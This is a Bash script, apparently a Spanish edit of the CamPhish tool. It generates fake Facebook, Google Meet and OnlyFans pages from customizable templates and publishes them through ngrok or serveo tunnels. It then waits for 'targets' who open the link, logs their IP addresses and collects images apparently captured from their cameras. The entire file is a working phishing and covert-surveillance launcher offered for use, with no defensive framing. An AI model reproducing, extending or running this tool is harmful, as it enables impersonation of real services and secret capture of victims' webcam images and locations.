#! /bin/bash

trap 'printf "\n";stop' 2
CWhite="\e[1;77m"     # Color blanco bold
CVerde="\e[1;92m"     # Color verde marino
Orange="\e[1;93m"     # COlor naranja bold
QColor="\e[0m"  # Quitar el formato de color

banner() {
    clear
    printf "$CVerde  _______  _______  _______ $QColor$CWhite _______          _________ _______          $QColor\n"
    printf "$CVerde (  ____ \(  ___  )(       )$QColor$CWhite(  ____ )|\     /|\__   __/(  ____ \|\     /|$QColor\n"
    printf "$CVerde | (    \/| (   ) || () () |$QColor$CWhite| (    )|| )   ( |   ) (   | (    \/| )   ( |$QColor\n"
    printf "$CVerde | |      | (___) || || || |$QColor$CWhite| (____)|| (___) |   | |   | (_____ | (___) |$QColor\n"
    printf "$CVerde | |      |  ___  || |(_)| |$QColor$CWhite|  _____)|  ___  |   | |   (_____  )|  ___  |$QColor\n"
    printf "$CVerde | |      | (   ) || |   | |$QColor$CWhite| (      | (   ) |   | |         ) || (   ) |$QColor\n"
    printf "$CVerde | (____/\| )   ( || )   ( |$QColor$CWhite| )      | )   ( |___) (___/\____) || )   ( |$QColor\n"
    printf "$CVerde (_______/|/     \||/     \|$QColor$CWhite|/       |/     \|\_______/\_______)|/     \|$QColor\n\n"

    printf " $CWhite Autor original: www.techchip.net $QColor \n"
    printf " $CWhite Editado por: Darling Buenaño y Carlos Almeida $QColor \n\n"
	printf " $CWhite Repositorio de github: git clone https://github.com/DarlynYami05/CamPhish.git $QColor \n\n"
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "Se necesita PHP, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
}

stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    if [[ $checkngrok == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "$Orange[$QColor$CWhite+$QColor$Orange] IP:$QColor$CWhite %s$QColor\n" $ip

    cat ip.txt >> saved.ip.txt
}


server() {
    command -v ssh > /dev/null 2>&1 || { echo >&2 "Se necesita SSH, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }

    printf "$CWhite[$QColor$Orange+$QColor$CWhite] Iniciando Serveo...$QColor\n"

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $subdomain_resp == true ]]; then
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
        sleep 8
    else
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
        sleep 8
    fi
    printf "$CWhite[$QColor\e[1;33m+$QColor$CWhite] Iniciando servidor php... (localhost:3333)$QColor\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '$Orange[$QColor$CWhite+$QColor$Orange] Link directo:$QColor$CWhite %s\n' $send_link
}


camphish() {
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi
    
    printf "\n-----Elija el servidor de tunel----\n"
    printf "\n$CVerde[$QColor$CWhite 01$QColor$CVerde]$QColor$Orange Ngrok$QColor\n"
    printf "$CVerde[$QColor$CWhite 02$QColor$CVerde]$QColor$Orange Serveo.net$QColor\n"
    default_option_server="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Elija una opción de reenvío de puertos: [Por defecto es 1] \e[0m' option_server
    option_server="${option_server:-${default_option_server}}"
    select_template
    
    if [[ $option_server -eq 2 ]]; then
        command -v php > /dev/null 2>&1 || { echo >&2 "Se necesita SSH, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
        start
    elif [[ $option_server -eq 1 ]]; then
        ngrok_server
    else
        printf "$Orange [!] Opción inválida!$QColor\n"
        sleep 1
        clear
        camphish
    fi
}


select_template() {
    if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
        printf "$Orange [!] ¡Opción de túnel no válida! inténtalo otra vez$QColor\n"
        sleep 1
        clear
        banner
        camphish
    else
        printf "\n-----Elije una plantilla----\n"
        printf "$CVerde[$QColor\e[1;77m01$QColor$CVerde]$QColor$Orange Facebook  $QColor\n"
        printf "$CVerde[$QColor\e[1;77m02$QColor$CVerde]$QColor$Orange Google    $QColor\n"
        printf "$CVerde[$QColor\e[1;77m03$QColor$CVerde]$QColor$Orange Instagram $QColor\n"
        printf "$CVerde[$QColor\e[1;77m04$QColor$CVerde]$QColor$Orange Meet      $QColor\n"
        printf "$CVerde[$QColor\e[1;77m05$QColor$CVerde]$QColor$Orange Youtube   $QColor\n"
		printf "$CVerde[$QColor\e[1;77m06$QColor$CVerde]$QColor$Orange Onlyfans  $QColor\n"
        
        default_option_template="1"
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Elije una plantilla: [Por defecto es 1] \e[0m' option_tem
        option_tem="${option_tem:-${default_option_template}}"

        ########## FACEBOOK ##########
        if [[ $option_tem -eq 1 ]]; then
            printf "\n-----Ingresa los datos para la plantilla Facebook----\n"
            
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la ruta de la foto de perfil: \e[0m' foto_perfil_facebook
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa el nombre de la persona que publicó: \e[0m' nombre_usuario_facebook
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la descripción de la publicación: \e[0m' descripcion_facebook
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la ruta de la foto de la publicación: \e[0m' foto_publicacion_facebook

            #Copiar y pegar las imagenes dentro del templates/
            extension=$( echo "${foto_perfil_facebook##*.}")
            cp "$foto_perfil_facebook" templates/facebook/foto_perfil.$extension  #Nota que con "$var" haces que se respete los espacios en la cadena
            foto_perfil_facebook='templates/facebook/foto_perfil.'$extension

            extension=$( echo "${foto_publicacion_facebook##*.}")
            cp "$foto_publicacion_facebook" templates/facebook/foto_publicacion.$extension
            foto_publicacion_facebook='templates/facebook/foto_publicacion.'$extension

            ruta_template="facebook/facebook.html"


        ########## GOOGLE ##########
        elif [[ $option_tem -eq 2 ]]; then
            printf " Google Phising aún está en desarrollo"
            ruta_template="google/google.html"

        
        ########## INSTAGRAM ##########
        elif [[ $option_tem -eq 3 ]]; then
            printf " Instagram Phising aún está en desarrollo"
            ruta_template="instagram/instagram.html"


        ########## MEET ##########
        elif [[ $option_tem -eq 4 ]]; then
            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa el nombre de la reunión: \e[0m' Nombre_de_la_reunion

            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa nombres de personas conectadas: \e[0m' Nombre_personas_conectadas

            #El nombre del html debe ser igual al que se generará, no al template original
            ruta_template="meet/meet.html"


        ########## YOUTUBE ##########
        elif [[ $option_tem -eq 5 ]]; then
            printf " Youtube Phising aún está en desarrollo"
            ruta_template="youtube/youtube.html"

        ########## ONLYFANS ##########
        elif [[ $option_tem -eq 6 ]]; then
            printf "\n-----Ingresa los datos para la plantilla Onlyfans----\n"
            
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa el nombre del perfil: \e[0m' nombre_perfil_onlyfans
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa el nombre de usuario: \e[0m' nombre_usuario_onlyfans
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la ruta de la foto de perfil: \e[0m' fotoPerfil
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la descripción del perfil: \e[0m' descripcion_onlyfans
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la ruta de la foto de portada: \e[0m' fotoPortada

            #Copiar y pegar las imagenes dentro del templates/
            extension=$( echo "${fotoPerfil##*.}")
            cp "$fotoPerfil" templates/onlyfans/foto_perfil.$extension
            fotoPerfil='templates/onlyfans/foto_perfil.'$extension

            extension=$( echo "${fotoPortada##*.}")
            cp "$fotoPortada" templates/onlyfans/foto_portada.$extension
            fotoPortada='templates/onlyfans/foto_portada.'$extension
            
            ruta_template="onlyfans/onlyfans.html"
        
        else
            printf "$Orange [!] ¡Opción de plantilla no válida! Inténtalo otra vez$QColor\n"
            sleep 1
            select_template
        fi
    fi
}


ngrok_server() {
    if [[ -e ngrok ]]; then
        echo ""
    else
        command -v unzip > /dev/null 2>&1 || { echo >&2 "Se necesita UNZIP, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
        command -v wget > /dev/null 2>&1 || { echo >&2 "Se necesita WGET, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
        printf "$CVerde[$QColor+$CVerde] Descargando Ngrok...\n"
        arch=$(uname -a | grep -o 'arm' | head -n1)
        arch2=$(uname -a | grep -o 'Android' | head -n1)

        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
            if [[ -e ngrok-stable-linux-arm.zip ]]; then
                unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-arm.zip
            else
                printf "$Orange[!] Error en la descarga... Termux, correr:$QColor$CWhite pkg install wget$QColor\n"
                exit 1
            fi

        else
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
            if [[ -e ngrok-stable-linux-386.zip ]]; then
                unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-386.zip
            else
                printf "$Orange[!] Error en la descarga... $QColor\n"
                exit 1
            fi
        fi
    fi

    printf "$CVerde[$QColor+$CVerde] Iniciando el servidor de php...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "$CVerde[$QColor+$CVerde] Iniciando el servidor de ngrok...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 15

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    printf "$CVerde[$QColor*$CVerde] Link directo:$QColor$CWhite %s$QColor\n" $link

    payload_ngrok
    checkfound
}


payload_ngrok() {
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    sed -i 's+ruta_template+'$ruta_template'+g' index.php
    
    if [[ $option_tem -eq 1 ]]; then
        foto_perfil_facebook=$link'/'$foto_perfil_facebook
        foto_publicacion_facebook=$link'/'$foto_publicacion_facebook
        sed 's+foto_perfil_facebook+'$foto_perfil_facebook'+g' templates/facebook/facebook_t.html > templates/facebook/facebook.html
        sed -i 's+nombre_usuario_facebook+'$nombre_usuario_facebook'+g' templates/facebook/facebook.html
        sed -i 's+descripcion_facebook+'"$descripcion_facebook"'+g' templates/facebook/facebook.html
        sed -i 's+foto_publicacion_facebook+'$foto_publicacion_facebook'+g' templates/facebook/facebook.html

    elif [[ $option_tem -eq 4 ]]; then
        sed 's+Nombre_de_la_reunion+'$Nombre_de_la_reunion'+g' templates/meet/meet_t.html > templates/meet/meet.html
        sed -i 's+Nombre_personas_conectadas+'$Nombre_personas_conectadas'+1' templates/meet/meet.html
		
	elif [[ $option_tem -eq 6 ]]; then
		fotoPerfil=$link'/'$fotoPerfil
        fotoPortada=$link'/'$fotoPortada
		sed 's+nombre_del_perfil+'"$nombre_perfil_onlyfans"'+g' templates/onlyfans/onlyfans_t.html > templates/onlyfans/onlyfans.html
		sed -i 's+nombre_de_usuario+'"$nombre_usuario_onlyfans"'+g' templates/onlyfans/onlyfans.html
		sed -i 's+foto_perfil+'$fotoPerfil'+g' templates/onlyfans/onlyfans.html
		sed -i 's+descripcion_onlyfans+'"$descripcion_onlyfans"'+g' templates/onlyfans/onlyfans.html
		sed -i 's+foto_portada+'$fotoPortada'+g' templates/onlyfans/onlyfans.html
    fi
    #rm -rf index3.html
}


checkfound() {
    printf "\n"
    printf "$CVerde[$QColor$CWhite*$QColor$CVerde] Esperando objetivos,$QColor$CWhite Presione Ctrl + C para salir...$QColor\n"
    
    while [ true ]; do
        if [[ -e "ip.txt" ]]; then
            printf "\n$CVerde[$QColor+$CVerde] ¡El objetivo abrió el enlace!\n"
            catch_ip
            rm -rf ip.txt
        fi
        sleep 0.5

        if [[ -e "Log.log" ]]; then
            printf "\n$CVerde[$QColor+$CVerde] ¡Imagen recibida!$QColor\n"
            rm -rf Log.log
        fi
        sleep 0.5
    done
}


#----- Tunel Serveo -----#
payload() {
    ruta_template="meet/meet.html"
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    sed 's+forwarding_link+'$send_link'+g' "template.php" > "index.php"
    
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$facebook_nombre'+g' index3.html > index2.html

    else
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$Nombre_de_la_reunion'+g' index3.html > index2.html
    fi
    #rm -rf index3.html
}

start() {
    default_choose_sub="Y"
    default_subdomain="saycheese$RANDOM"

    printf '\e[1;33m[$QColor$CWhite+$QColor\e[1;33m] ¿Cambiar de subdominio? (Por defecto:$QColor$CWhite [Y/n] $QColor\e[1;33m): $QColor'
    read choose_sub
    choose_sub="${choose_sub:-${default_choose_sub}}"
    
    if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
        subdomain_resp=true
        printf '\e[1;33m[$QColor$CWhite+$QColor\e[1;33m] Subdominio: (Por defecto:$QColor$CWhite %s $QColor\e[1;33m): $QColor' $default_subdomain
        read subdomain
        subdomain="${subdomain:-${default_subdomain}}"
    fi

    server
    payload
    checkfound
}

banner
dependencies
camphish